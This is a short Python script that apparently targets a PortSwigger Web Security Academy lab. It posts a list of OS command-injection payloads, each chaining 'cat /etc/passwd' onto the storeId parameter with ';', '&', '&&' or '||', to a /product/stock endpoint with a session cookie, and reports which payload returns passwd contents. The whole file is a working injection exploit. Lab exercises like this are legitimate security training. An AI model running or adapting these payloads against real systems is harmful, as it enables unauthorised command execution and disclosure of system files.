
import requests


url = "https://acf21fec1e59d30cc051465800c00013.web-security-academy.net/product/stock"


cookie = {
	"session":"IgQoiz4DPEq1rvtYEqEJZaDY4Y0Qe3kD"
}

content = "root:x:0"

payloads = [
	";cat /etc/passwd",
	"&cat /etc/passwd",
	"&&cat /etc/passwd",
	"||cat /etc/passwd",
	"&cat /etc/passwd&",
	"&&cat /etc/passwd&&",
	"||cat /etc/passwd||"

]

for i in payloads:

	data = {
		"productId":1,
		"storeId":"1{}".format(i)
	}


	r = requests.post(url,cookies=cookie,data=data)

	if content in r.text:
		print(i)
		